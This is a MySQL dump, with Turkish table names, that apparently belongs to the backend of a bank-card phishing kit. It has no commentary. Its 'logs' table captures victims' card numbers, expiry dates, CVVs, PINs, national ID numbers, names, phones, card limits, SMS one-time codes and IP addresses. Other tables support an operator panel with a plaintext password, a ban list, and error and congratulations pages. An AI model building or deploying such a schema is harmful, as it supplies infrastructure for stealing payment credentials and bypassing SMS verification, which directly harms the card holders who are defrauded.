DROP TABLE ban;

CREATE TABLE `ban` (
  `ban` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




DROP TABLE hata;

CREATE TABLE `hata` (
  `hata` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




DROP TABLE logs;

CREATE TABLE `logs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sayfa` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `kk` varchar(255) NOT NULL,
  `skt` varchar(255) NOT NULL,
  `cvv` varchar(255) NOT NULL,
  `tckn` varchar(255) NOT NULL,
  `adsoyad` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL,
  `tel` varchar(255) NOT NULL,
  `limitt` varchar(255) NOT NULL,
  `pin` varchar(255) NOT NULL,
  `sms` varchar(255) NOT NULL,
  `sms2` varchar(255) NOT NULL,
  `bildirim` varchar(255) NOT NULL,
  `tarih` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




DROP TABLE panel;

CREATE TABLE `panel` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sifre` varchar(255) NOT NULL,
  `saniye` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

INSERT INTO panel VALUES("1","wine","3");



DROP TABLE pin;

CREATE TABLE `pin` (
  `pin` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




DROP TABLE sms;

CREATE TABLE `sms` (
  `sms` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




DROP TABLE sms2;

CREATE TABLE `sms2` (
  `sms2` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




DROP TABLE tebrik;

CREATE TABLE `tebrik` (
  `tebrik` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;




